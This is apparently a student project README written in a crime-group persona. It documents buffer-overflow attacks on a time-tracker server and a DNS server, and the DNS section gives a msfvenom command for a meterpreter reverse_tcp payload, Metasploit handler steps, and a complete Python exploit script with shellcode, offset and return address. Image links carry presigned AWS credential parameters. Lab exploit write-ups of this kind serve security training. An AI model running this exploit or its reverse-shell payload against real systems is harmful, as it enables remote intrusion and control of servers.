# Buffer-Overflow

<h2>Description</h2>
Project consists of multiple buffer overflow attacks starting from various difficulty. All of them would be under my persona to fit into the russian crime group.
<br />

<h2>Languages and Utilities Used</h2>

- <b>Putty (Linux)</b>
- <b>Immunity Debugger</b>
- <b>Mona</b>
- <b>Metasploit</b>


<h2>Environments Used </h2>

- <b>Amazon WorkSpace</b>

<h2>Buffer Overflow:Launch shell</h2>


Gregor,

	After an analysis of the TimeTrackerServer.exe, the important command that guarantees to launch the server is inputting a username that has less than 35 characters. The hours do not impact the launch of the server. Command, abababababababababababababababababab 10090 will crash the server due to the 36 characters in the username. The server will catch an exception and try to spawn. The subroutine responsible for spawning the shell is sub_13781230.The memory address that gets overridden is located in sub_13781120. The original return address that gets overwritten is 1378115F.

CeleanaS00 (Helpful Apprentice)

<h2>Bufferoverflow exploit on DNS Server</h2>

Gregor,

I was able to spawn a reverse shell in the DNS server.  

To  run the exploit 

Use msfvemon to create a listening host and listening port for the script to reverse tcp
and the payload for the script.
msfvenom -p window/meterpreter/reverse_tcp LHOST=LInuxIPAddress -f python -a x86 -b “\x00”
Copy python script to nano. Crtl X + y to save the script (Ex:seh1)
After script is saved, open the dns server in command prompt or terminal. Cd into directory where DNS server is located. To open server using start dnsserver (port) command
Once the terminal or command prompt is open, you will then need to connect to the sever using nc (ip address) (port Number). Ctrl C, then run program. 
To run program use command ./(file). (Ex: ./seh1) 
In a separate, linux window, open metasploit using msfconsole. Download if needed. Use command msf>use/multi/handler and msf>exploit to listen in on the port. Typical port is 4444. Exploit will then gain root in the server. You will have three windows open.
To see the ip address and system info use command meterpreter>ipconfig and meterpreter>sysinfo. 

<b>Python script containing payload</b>

#!/usr/bin/python

import sys, socket

buf =  ""

buf += "\xbf\xcd\x6c\xd1\x3b\xdb\xd0\xd9\x74\x24\xf4\x5a\x2b"

buf += "\xc9\xb1\x54\x83\xea\xfc\x31\x7a\x0f\x03\x7a\xc2\x8e"

buf += "\x24\xc7\x34\xcc\xc7\x38\xc4\xb1\x4e\xdd\xf5\xf1\x35"

buf += "\x95\xa5\xc1\x3e\xfb\x49\xa9\x13\xe8\xda\xdf\xbb\x1f"

buf += "\x6b\x55\x9a\x2e\x6c\xc6\xde\x31\xee\x15\x33\x92\xcf"

buf += "\xd5\x46\xd3\x08\x0b\xaa\x81\xc1\x47\x19\x36\x66\x1d"

buf += "\xa2\xbd\x34\xb3\xa2\x22\x8c\xb2\x83\xf4\x87\xec\x03"

buf += "\xf6\x44\x85\x0d\xe0\x89\xa0\xc4\x9b\x79\x5e\xd7\x4d"

buf += "\xb0\x9f\x74\xb0\x7d\x52\x84\xf4\xb9\x8d\xf3\x0c\xba"

buf += "\x30\x04\xcb\xc1\xee\x81\xc8\x61\x64\x31\x35\x90\xa9"

buf += "\xa4\xbe\x9e\x06\xa2\x99\x82\x99\x67\x92\xbe\x12\x86"

buf += "\x75\x37\x60\xad\x51\x1c\x32\xcc\xc0\xf8\x95\xf1\x13"

buf += "\xa3\x4a\x54\x5f\x49\x9e\xe5\x02\x05\x53\xc4\xbc\xd5"

buf += "\xfb\x5f\xce\xe7\xa4\xcb\x58\x4b\x2c\xd2\x9f\xac\x07"

buf += "\xa2\x30\x53\xa8\xd3\x19\x97\xfc\x83\x31\x3e\x7d\x48"

buf += "\xc2\xbf\xa8\xe5\xc7\x57\x59\xfa\xa4\x8f\x35\xf8\x2a"

buf += "\xde\x99\x75\xcc\xb0\x71\xd6\x41\x70\x22\x96\x31\x18"

buf += "\x28\x19\x6d\x38\x53\xf3\x06\xd2\xbc\xaa\x7f\x4a\x24"

buf += "\xf7\xf4\xeb\xa9\x2d\x71\x2b\x21\xc4\x85\xe5\xc2\xad"

buf += "\x95\x11\xb3\x4d\x66\xe1\x5e\x4e\x0c\xe5\xc8\x19\xb8"

buf += "\xe7\x2d\x6d\x67\x18\x18\xed\x60\xe6\xdd\xc4\x1b\xd0"

buf += "\x4b\x69\x74\x1c\x9c\x69\x84\x4a\xf6\x69\xec\x2a\xa2"

buf += "\x39\x09\x35\x7f\x2e\x82\xa3\x80\x07\x76\x64\xe9\xa5"

buf += "\xa1\x42\xb6\x56\x84\xd1\xb1\xa9\x5a\xf7\x19\xc2\xa4"

buf += "\xb7\x99\x12\xcf\x37\xca\x7a\x04\x18\xe5\x4a\xe5\xb3"

buf += "\xae\xc2\x6c\x55\x1c\x72\x70\x7c\xc0\x2a\x71\x72\xd9"

buf += "\x3b\xfc\x75\xde\x43\xfe\x4a\x08\x7a\x74\x8b\x88\x39"

shellcode= "A" * 2003 + "\x3f\x12\x50\x62" + "\x90" *32 + buf

try:
            	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            	s.connect(('10.0.2.50',1234)
            	payload = "GETD /.:/" + shellcode
            	s.send((payload))
            	s.close()

except:
            	print "Error connecting to server"
            	sys.exit()

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267519/meterpreter%20ip.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T145024Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=874a4b41771afbf521680dbc012808fc69da944de0b46845ce5b668597093376
<br />


<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267519/meterpreter%20os.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T143835Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=53f67dda9fef3ea44aa4fdcc155eed948f794133f5e8aaae6aa93568e4cc3c68
<br />

<h2>Bypass DEP: Buffer Overflow</h2>

The original exploit failed because when creating the script I had turned off the DEP to make it easier to overflow the dns server. When the host switched, the original script would not work if the DEP was enabled.

In order to fix this, I used a rop chain to bypass the dep in mona. Then, I copied the code to then make changes to my script. I added the rop chain code to my script. The new script used the rop chain padding and a new shellcode to ensure we can bypass the dep on the new dns server (see dep bypass code image). 

Proof of successful connection can be found below.

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267817/dep%20bypass%20code.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T145129Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=f09b6a8d4c328c4cb349d63d231ad948eabd025e808b16795e53196fcdf151d2
<br />

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267817/dep%20bypass%20code2.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T145129Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=962486ae91a6864f50388cc0ae7a51efb48bf83540623725bae04798b59a6127
<br />

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267817/dep%20bypas%20code3.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T145129Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=de5b05e8eceed3e46254a4723d15a19a59b93f56108d4458ee99fff60db889fb
<br />

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267817/dep%20connection.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T145129Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=11756dbeda107177f8d8a4f89131c9946200d60b63365fa7a6127b9fa88c0f0c
<br />

<p align="center">
Script<br/>
<img src=https://s3.amazonaws.com/gbstool/submissions2020/267817/dep%20connection.PNG?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20240301T145129Z&X-Amz-SignedHeaders=host&X-Amz-Expires=36900&X-Amz-Credential=AKIAJBIZLMJQ2O6DKIAA%2F20240301%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=11756dbeda107177f8d8a4f89131c9946200d60b63365fa7a6127b9fa88c0f0c
<br />


<h3>Attribution Actor information</h3>

He uses an encryption company or application, India 59[.]162[.]204[.]86 NAM01-BN3-obe[.]outbound[.]hushcrypt[.]com, and a google source, US 66[.]249[.]93[.]111, that is hosting the mail to disguise his information Also, Gregor seems to value secrecy as shown by his email header Gregor007. The 007 references a famous movie spy.
